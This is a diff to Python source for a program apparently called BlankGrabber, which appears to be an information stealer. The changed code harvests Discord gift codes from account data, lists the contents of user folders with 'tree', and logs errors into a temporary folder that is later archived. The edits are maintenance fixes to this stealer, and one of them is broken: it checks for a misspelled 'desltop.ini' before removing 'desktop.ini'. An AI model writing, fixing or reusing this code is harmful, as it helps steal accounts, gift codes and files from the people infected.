@@ -172,11 +172,10 @@ class utils:
         def newfunc(*args, **kwargs):
             try:
                 return func(*args, **kwargs)
-            except Exception:
-                # trb = traceback.extract_tb(sys.exc_info()[2])[-1]
-                # utils.ERRORLOGS.append(f"Line {trb[1]} : {trb[2]} : {e.__class__.__name__} : {e}")
-                trb = traceback.format_exc()
-                utils.ERRORLOGS.append(trb)
+            except Exception as e:
+                if not isinstance(e, UnicodeEncodeError):
+                    trb = traceback.format_exc()
+                    utils.ERRORLOGS.append(trb)
         return newfunc
     
     @staticmethod
@@ -221,10 +220,6 @@ class utils:
         if DName is None:
             DName = os.path.basename(path)
         tree = subprocess.run("tree /A /F", shell= True, capture_output= True, cwd= path).stdout.decode(errors= 'ignore')
-        #PIPE = "│"
-        #ELBOW = "└──"
-        #TEE = "├──"
-        #tree = tree.replace("+---", TEE).replace(r"\---", ELBOW).replace("|", PIPE)
         tree = tree.splitlines()
         tree = DName + "\n" + "\n".join(tree[3:])
         return tree.strip()
@@ -674,12 +669,13 @@ class Discord:
                 if 'code' in r:
                     r = json.loads(r)
                     for i in r:
-                        code = i.get('code')
-                        if i.get('promotion') is None:
-                            continue
-                        title = i['promotion'].get('outbound_title')
-                        if code and title:
-                            gifts.append(f'{title}: {code}')
+                        if isinstance(i, dict):
+                            code = i.get('code')
+                            if i.get('promotion') is None:
+                                continue
+                            title = i['promotion'].get('outbound_title')
+                            if code and title:
+                                gifts.append(f'{title}: {code}')
                 if len(gifts) == 0:
                     gifts = 'Gift Codes: (NONE)'
                 else:
@@ -764,7 +760,7 @@ class BlankGrabber:
     def errReport(self) -> None:
         if utils.ERRORLOGS:
             with open(os.path.join(self.tempfolder, 'Error Logs.txt'), 'w') as file:
-                file.write('\n--------------------------------------------------------------------------\n'.join(utils.ERRORLOGS))
+                file.write('\n===============================================================================\n'.join(utils.ERRORLOGS))
     
     def cleanUp(self) -> None:
         if os.path.isfile(self.archive):
@@ -970,7 +966,8 @@ class BlankGrabber:
                 if not os.path.isdir(location):
                     continue
                 dircontent = os.listdir(location)
-                dircontent.remove('desktop.ini')
+                if 'desltop.ini' in dircontent:
+                    dircontent.remove('desktop.ini')
                 if dircontent:
                     output[os.path.split(location)[-1]] = utils.tree(location)
             for key, value in output.items():
